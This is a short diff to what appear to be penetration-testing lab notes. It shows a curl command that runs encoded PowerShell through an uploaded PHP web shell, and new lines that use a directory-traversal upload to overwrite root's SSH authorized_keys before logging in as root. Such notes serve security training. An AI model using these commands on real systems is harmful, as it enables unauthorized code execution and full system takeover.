@@ -12,3 +12,10 @@ $EncodedText =[Convert]::ToBase64String($Bytes)
 
 curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20+$EncodedText
 ```
+
+### Upload non-executable file
+```
+upload ../../../../../../../root/.ssh/authorized_keys
+rm ~/.ssh/known_hosts
+ssh -p 2222 -i privatekey root@mountaindesserts.com
+```
